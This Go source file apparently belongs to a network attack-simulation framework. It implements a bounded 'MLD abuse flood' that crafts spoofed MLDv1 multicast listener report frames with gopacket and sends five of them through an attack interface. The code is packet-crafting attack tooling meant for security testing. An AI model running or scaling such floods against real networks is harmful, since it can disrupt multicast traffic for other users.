// mld.go implements the MLD abuse flood attack superset.
//
// Durability (from the catalog): transient-decay. The attack sends a
// bounded burst of MLDv1 report frames. The behavior is bounded by
// duration and exits on schedule, reporting frame counts.
//
// This is a flood-class behavior: it uses the sync.Pool craft path
// for pre-serialized buffers.
//
// Spec-authored — the baseline has no craft for this attack.

package ip6

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type mldFinding struct {
	Action     string `json:"action"`
	FrameCount int    `json:"frame_count"`
	Bounded    bool   `json:"bounded"`
}

// RunMLD sends a bounded burst of MLDv1 report frames. The burst is
// bounded by a fixed frame count for the in-memory test shape; the
// behavior exits on schedule and reports frame counts.
func RunMLD(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	mcastGroup := net.ParseIP("ff0e::1234")

	frameCount := 5
	for i := 1; i <= frameCount; i++ {
		pkt, err := craftMLDReport(src, mcastGroup)
		if err != nil {
			return fmt.Errorf("mld: craft frame %d: %w", i, err)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return fmt.Errorf("mld: send frame %d: %w", i, err)
		}
		if err := ctx.Err(); err != nil {
			return err
		}
	}

	detail, _ := json.Marshal(mldFinding{
		Action:     "mld-abuse-flood",
		FrameCount: frameCount,
		Bounded:    true,
	})
	deps.Emitter.Finding("mld", detail)

	return nil
}

// craftMLDReport builds an MLDv1 Multicast Listener Report for the
// given multicast group. Uses the pool craft path.
func craftMLDReport(src net.HardwareAddr, mcastGroup net.IP) ([]byte, error) {
	mcastMAC := multicastMACForIPv6(mcastGroup)

	eth := &layers.Ethernet{
		DstMAC:       mcastMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   1,
		SrcIP:      net.ParseIP("fe80::1"),
		DstIP:      mcastGroup,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeMLDv1MulticastListenerReportMessage, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	mld := &layers.MLDv1MulticastListenerReportMessage{
		MLDv1Message: layers.MLDv1Message{
			MaximumResponseDelay: 0,
			MulticastAddress:     mcastGroup,
		},
	}
	return craftPool(eth, ip, icmp, mld)
}

var _ gopacket.SerializableLayer = (*layers.MLDv1MulticastListenerReportMessage)(nil)
